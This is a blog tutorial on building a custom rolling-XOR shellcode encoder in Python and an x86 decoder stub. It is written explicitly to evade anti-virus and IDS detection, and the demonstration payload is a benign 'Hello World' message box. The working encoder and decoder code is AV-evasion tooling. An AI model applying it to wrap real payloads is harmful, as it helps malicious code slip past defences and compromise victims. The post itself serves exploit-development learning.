---
layout: post
title: Custom Shellcode Encoder/Decoder (Rolling XOR)
---

Lets assume, you're in middle of a penetration test and were trying to gain access to a machine with Anti-Virus installed. Unfortunatuly, on every attempt you made AV was able to identify and block you from excuting the payload making you drive crazy and frustrating...

Besides the fact that most of the well known encoders are been detected by modern AV and IDS products. In such scenario using of custom encoders would be handy.

<div class="message">
In this article, I'd be creating a custom encoding scheme based on simple XOR Operations called Rolling XOR. this technique could be helful in evading Anti-Virus and Intrusion Detection Systems(IDS) where necessary. 
</div>

----

<strong>What is Rolling XOR Encoding Scheme..? </strong>

This encoding scheme basically uses a radomly generated key and performs the XOR operation on the first byte in the given array and uses the result as the input(new XOR key) to perform XOR operation with the next consecutive byte and so on.


#### Rolling XOR Python Encoder

1. Generates a random byte and use it as the base/key to perform the XOR operations.
2. Places the generated XOR key as first byte in the new array "xorout_f1/f2".
3. Performs XOR between the first byte in array "xorout_f1/f2" and first byte in "code" variable and append result to new array "xorout_f1/f2"
4. This basically takes the result of previous XOR operation as the input(byte) and performs XOR operation with the next byte and same happens with all other bytes.
5. Continues the XOR operation till the last byte in "code" variable and final result will be saved in new array "xorout_f1/f2".

{% highlight python %}

#Author: Greycel
#Website: https://greycel.github.io
#!/usr/bin/python

import os
import sys
import random

code = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24\x2C\x57\x68\x72\x6c\x64\x2e\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8B\xDC\x57\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x40\xFF\x54\x24\x40\x57\xFF\xD0")

xorout_f1 = [] 
xorout_f2 = [] 
rand_key = random.randint(1,255)
xorout_f1.append(rand_key)
xorout_f2.append(rand_key)
print "\n[*] Random XOR key used: " '0x%02x' %rand_key + " " + str(xorout_f1)

for i in range(0, len(code)):  
    j = ord(code[i]) ^ xorout_f1[i]
    k = ord(code[i]) ^ xorout_f2[i]
    xorout_f1.append(j)
    xorout_f2.append(k)
xorout_f1 = (",".join("0x%02x" %c for c in xorout_f1))
xorout_f2 = ("".join("\\x%02x" %c for c in xorout_f2))

print "==================================="
print "Total Length: " + str(len(xorout_f2)/4) + "bytes"
print "\n[*] Rolling Xor Output F1: \n%s "  %xorout_f1
print "\n[*] Rolling Xor Output F2: \n%s" %xorout_f2
{% endhighlight %}
<img src="{{ site.baseurl }}/public/rollingXOR_01.jpg">

----


###Decoder Stub

Following is our decoder stub which helps us to decode the encoded shellcode. Here we will be using JMP-CALL-POP technique, to get to our encoded shellcode and thereafter we decode the shellcode back to original at runtime and execute it.


{% highlight python %}
; Author:   Greycel
; Website:  https://greycel.github.io 
; This decodes the encoded Rolling XOR scheme back to its original.
; To avoid NULL bytes, update the Counter instructions "MOV CL, len", 
;  "DEC CL", "CMP CL,DL" as per the length of code variable .


global _start

section .text
_start:
        jmp call_code

decoder:                   ;Start of XOR Operation
        POP ESI            ;Pointer to Shellcode
        PUSH ESI           ;Save pointer for later use
        MOV EDI,ESI        ;Copy pointer address in EDI
        XOR ECX,ECX        ;Zeroout the registers ECX, EDX
        MOV EDX,ECX
        MOV CL,len         ;Setup counter (Total Length)
loop1:
        MOV AL,[ESI]       ;Take the first byte of shellcode
        MOV BL,[ESI+1]     ;Take the second byte of shellcode
        XOR AL,BL          ;Perform XOR and save result in AL
        MOV [EDI],AL       ;Replace the first bytes of EDI with the result
        INC ESI            ;Increment ESI and EDI
        INC EDI
        DEC CL                ;Decrement the Counter
        CMP CL,DL             ;Check for condition
        JNZ loop1             ;Jump to loop1 if condition has not met
        mov byte[ESI-1],0x90  ;Replace the last trail byte with NOP
        JMP code


call_code:
        call decoder
        code: db 0xaf,0x53,0x60,0xb2,0x00,0x30,0x54,0xab,0x99,0xc3,0x48,0x1a,0x16,0x9d,0xcf,0xdb,0x50,0x22,0x0a,0x39,0xf0
        
[.....]

        0xf4,0xf7,0x9f,0xcf,0xbd,0xd2,0xb1,0xd9,0x9c,0xe4,0x8d,0xf9,0xad,0x52,0x26,0x02,0x42,0xbd,0xe9,0xcd,0x8d,0xda,0x25,0xf5
        len:    equ $-code
{% endhighlight %}


Having the above decoder stub ready, with the help of "nasm" compile the assembly code and generate the corresponding object file. Then use the "Objdump" to extract the decoding stub along with encoded shellcode appended to it. For commands to compile and extract shellcode <a href="/2017/04/15/Handy-Commands-ExpDev/">Check</a>.

<img src="{{ site.baseurl }}/public/rollingXOR_decode_stub_out.jpg">

----



###Executing the Shellcode on Windows

For POC purpose, I've used the encoded message box shellcode which would eventually gets decoded at runtime with our decoded stub and executes the Hello World Message Box Popup. Following is our actual decoder stub in debugger without the encoded shellcode

<img src="{{ site.baseurl }}/public/Decoder_Stub_in_DBG.jpg">


Encoded shellcode within debugger. As per the decoder stub instruction "POP ESI" will pop the address (0x00446028) of encoded shellcode into "ESI" register, which is where the encoded shellcode begins.
<img src="{{ site.baseurl }}/public/Encoded_Shellcode_in_DBG.jpg">


By the time the decoder stub completes its execution we will have our actual shellcode ready to be executed from address (0x00446028) which is the beginning of shellcode and continues to execute our payload popping the "Hello World" message box.
<img src="{{ site.baseurl }}/public/Decoded_Shellcode_in_DBG.jpg">


<img src="{{ site.baseurl }}/public/Shellcode_execution_in_DBG.jpg">


